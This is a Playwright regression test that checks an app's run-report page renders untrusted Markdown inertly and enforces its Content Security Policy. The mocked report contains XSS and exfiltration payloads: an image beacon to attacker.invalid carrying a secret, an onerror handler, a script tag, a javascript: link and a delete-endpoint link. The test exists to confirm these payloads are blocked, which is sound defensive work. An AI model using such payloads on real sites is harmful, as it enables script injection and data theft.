import { expect, test } from "@playwright/test";

for (const theme of ["dark", "light"]) {
  test(`untrusted report Markdown stays inert in ${theme}`, async ({ page }) => {
    await page.addInitScript((value) => localStorage.setItem("theme", value), theme);

    const runId = "00000000-0000-4000-8000-000000000020";
    const resourceRequests: string[] = [];

    page.on("request", (request) => {
      if (request.url().includes("markdown-security-probe")) resourceRequests.push(request.url());
    });

    await page.route("**/api/v1/**", async (route) => {
      const pathname = new URL(route.request().url()).pathname;
      const headers = { "access-control-allow-origin": "http://localhost:3000" };

      if (pathname === `/api/v1/runs/${runId}/events`) {
        return route.fulfill({ headers, contentType: "text/event-stream", body: "" });
      }

      if (pathname === `/api/v1/runs/${runId}`) {
        return route.fulfill({
          headers,
          json: {
            id: runId,
            workflow_id: runId,
            task: "Markdown output security regression",
            status: "COMPLETED",
            created_at: "2026-11-03T12:00:00Z",
            total_tokens: 0,
            plan: [],
            final_report: [
              "## Security report",
              "![Tracking image](https://attacker.invalid/markdown-security-probe?secret=test)",
              "![Local image](/markdown-security-probe)",
              '<img src="/markdown-security-probe" onerror="window.markdownExecuted=true">',
              "<script>window.markdownExecuted=true</script>",
              "[Unsafe action](javascript:alert%281%29)",
              "[Local action](/api/v1/runs/delete)",
              "[Source](https://example.com/report)",
              "| Result | Status |\n| - | - |\n| Markdown | Safe |",
            ].join("\n\n"),
          },
        });
      }

      return route.fulfill({ headers, json: { items: [], total: 0 } });
    });

    const response = await page.goto(`/runs/${runId}`);

    expect(response?.headers()["content-security-policy"]).toContain("img-src 'self' data: blob:");
    expect(response?.headers()["content-security-policy"]).toContain("frame-ancestors 'none'");
    await expect(page.getByRole("heading", { name: "Security report" })).toBeVisible();
    await expect(page.getByText("Tracking image", { exact: true })).toBeVisible();
    await expect(page.getByRole("table")).toBeVisible();
    await expect(page.getByRole("link", { name: "Unsafe action" })).toHaveCount(0);
    await expect(page.getByRole("link", { name: "Local action" })).toHaveCount(0);

    const source = page.getByRole("link", { name: "Source", exact: true });

    await expect(source).toHaveAttribute("href", "https://example.com/report");
    await expect(source).toHaveAttribute("target", "_blank");
    await expect(source).toHaveAttribute("rel", "noopener noreferrer");
    await expect(source).toHaveAttribute("referrerpolicy", "no-referrer");
    expect(await page.evaluate(() => "markdownExecuted" in window)).toBe(false);
    expect(resourceRequests).toEqual([]);

    // Exercise CSP independently of SafeMarkdown by injecting a real image and fetch.
    const outboundRequests: string[] = [];

    await page.route("https://csp-probe.invalid/**", async (route) => {
      outboundRequests.push(route.request().url());
      await route.abort();
    });

    const violations = await page.evaluate(async () => {
      const directives: string[] = [];
      const observed = new Promise<void>((resolve) => {
        document.addEventListener("securitypolicyviolation", (event) => {
          directives.push(event.effectiveDirective);

          if (directives.includes("img-src") && directives.includes("connect-src")) resolve();
        });
      });
      const image = new Image();
      const imageBlocked = new Promise<void>((resolve, reject) => {
        image.onerror = () => resolve();
        image.onload = () => reject(new Error("External image unexpectedly loaded"));
      });

      image.src = "https://csp-probe.invalid/pixel";
      document.body.append(image);

      const fetchBlocked = fetch("https://csp-probe.invalid/collect").then(
        () => {
          throw new Error("External fetch unexpectedly succeeded");
        },
        () => undefined,
      );

      await Promise.all([observed, imageBlocked, fetchBlocked]);
      image.remove();

      return directives;
    });

    expect(violations).toEqual(expect.arrayContaining(["img-src", "connect-src"]));
    expect(outboundRequests).toEqual([]);
  });
}
